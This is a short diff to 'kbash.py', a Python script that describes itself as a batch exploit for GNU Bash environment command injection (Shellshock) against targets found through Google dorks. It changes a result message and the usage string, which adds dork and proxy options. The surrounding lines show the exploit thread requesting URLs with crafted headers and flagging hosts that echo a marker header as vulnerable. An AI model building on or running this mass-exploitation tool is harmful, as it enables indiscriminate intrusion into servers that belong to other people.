@@ -22,7 +22,7 @@ class Exploit(threading.Thread):
 					#print headers
 					r = requests.get(url, headers = headers, verify = False, timeout = 10)
 					if 'header' in r.headers and 'kbash-scaned' in r.headers['header']:
-						print "[ vulnerable ] " + url
+						print "[ FIND vulnerable ] " + url
 					else:
 						print "[ no vulnerable ] " + url[:50]
 					#print str(r.status_code) + " : " + url
@@ -80,7 +80,7 @@ class Google(threading.Thread):
 
 
 
-USAGE = "exp -t thread -c page_count -e command"
+USAGE = "python kbash.py [-t thread -c page_count -e command -d dork -p proxy]"
 DESC  = "Batch Exploit GNU Bash Env Command Injection base on Google. Version 2.0 \n code by kingx  -   http://cih.so"
 epilog = "License, requests, etc: https://github.com/KxCode"
 parser = argparse.ArgumentParser(usage=USAGE, description=DESC, epilog=epilog)
